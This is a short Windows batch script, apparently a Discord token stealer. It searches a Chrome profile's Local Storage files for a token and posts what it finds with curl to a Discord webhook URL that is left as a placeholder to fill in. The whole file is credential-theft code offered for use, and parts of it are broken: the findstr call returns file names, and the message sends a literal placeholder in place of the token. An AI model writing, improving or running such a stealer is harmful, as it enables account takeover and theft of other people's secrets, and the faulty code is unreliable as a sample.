@echo off
setlocal enabledelayedexpansion

REM Define Chrome user data directory
set "chromeUserDataDir=%LocalAppData%\Google\Chrome\User Data"

REM Define Discord webhook URL
set "webhookURL=https://discord.com/api/webhooks/your_webhook_url_here"

REM Find Chrome profile directory
for /d %%I in ("%chromeUserDataDir%\Profile*") do (
    set "chromeProfileDir=%%I"
)

REM Check if Chrome profile directory is found
if not defined chromeProfileDir (
    echo Chrome profile directory not found.
    exit /b
)

REM Grab Discord token from Chrome browser
set "token="
for /f "tokens=3" %%A in ('findstr /si /m "token" "%chromeProfileDir%\Local Storage\leveldb\*.ldb"') do (
    set "token=%%A"
)

REM Check if token is found
if not defined token (
    echo Discord token not found.
    exit /b
)

REM Send token to Discord webhook
set "data={\"content\":\"Discord token: !HERE_PUT_THE_TOKEN!\"}"
curl -H "Content-Type: application/json" -X POST -d !data! !webhookURL!

echo Token sent to Discord webhook.

:end